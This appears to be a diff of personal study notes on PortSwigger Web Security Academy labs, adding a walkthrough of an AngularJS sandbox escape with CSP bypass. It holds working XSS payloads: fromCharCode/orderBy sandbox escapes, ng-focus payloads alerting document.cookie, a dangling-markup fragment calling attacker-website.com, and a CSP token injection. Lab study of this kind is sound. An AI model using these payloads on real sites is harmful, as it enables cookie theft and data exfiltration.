@@ -792,8 +792,7 @@ response:
     $scope.value = $parse(key)($scope.query);
 });</script>
 ```
-3. **final payload**:
-portswiggers solution:
+3.Portswiggers solution:
 ```
 https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
 ```
@@ -802,6 +801,7 @@ https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.pr
 
 The exploit uses toString() to create a string without using quotes. It then gets the String prototype and overwrites the charAt function for every string. This effectively breaks the AngularJS sandbox. Next, an array is passed to the orderBy filter. We then set the argument for the filter by again using toString() to create a string and the String constructor property. Finally, we use the fromCharCode method generate our payload by converting character codes into the string x=alert(1). Because the charAt function has been overwritten, AngularJS will allow this code where normally it would not.
 
+**final payload**:
 ```
 1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
 ```
@@ -818,6 +818,51 @@ materials:
 "><img src='//attacker-website.com?
 ```
 after **?** will come part of the response as parameter (until another **'** will appear and close the url address)
+
+
+# ***2.Lab: Reflected XSS with AngularJS sandbox escape and CSP***
+https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp
+
+ This lab uses CSP and AngularJS.
+
+To solve the lab, perform a cross-site scripting attack that bypasses CSP, escapes the AngularJS sandbox, and alerts document.cookie. 
+
+
+**material:**
+```htm
+<input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">
+```
+
+hiding the window object from the AngularJS sandbox:
+```
+[1].map(alert)
+```
+ 
+(*from: https://portswigger.net/research/angularjs-csp-bypass-in-56-characters)
+<input id=x ng-focus=$event.path|orderBy:'(y=alert)(1)'>
+
+1. adjust payload:
+<input id=x ng-focus=$event.path|orderBy:'(y=alert)(document.cookie)'>
+
+2. paste payload with url in exploit server:
+```htm
+<script>
+location='https://0a2b0029033422e6c0026c7000df00fc.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(y=alert)(document.cookie)%27%3E#x';
+</script>
+```
+**explanation:**
+ The exploit uses the ng-focus event in AngularJS to create a focus event that bypasses CSP. It also uses $event, which is an AngularJS variable that references the event object. The path property is specific to Chrome and contains an array of elements that triggered the event. The last element in the array contains the window object.
+
+Normally, | is a bitwise or operation in JavaScript, but in AngularJS it indicates a filter operation, in this case the orderBy filter. The colon signifies an argument that is being sent to the filter. In the argument, instead of calling the alert function directly, we assign it to the variable z. The function will only be called when the orderBy operation reaches the window object in the $event.path array. This means it can be called in the scope of the window without an explicit reference to the window object, effectively bypassing AngularJS's window check. 
+
+# Lab Solved
+
+
+
+<span style="color:yellow;font-weight:700;font-size:30px">
+Content security policy - labs
+</span>
+https://portswigger.net/web-security/cross-site-scripting/content-security-policy
 
 
 # ***1.Lab: Reflected XSS protected by very strict CSP, with dangling markup attack***
@@ -944,6 +989,4 @@ token=;script-src-elem 'unsafe-inline'
 https://0a32002b034ca0a2c0db0e8600880038.web-security-academy.net/?search=%3Cscript%3Ealert%28%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
 
 # Lab solved
-
-
 
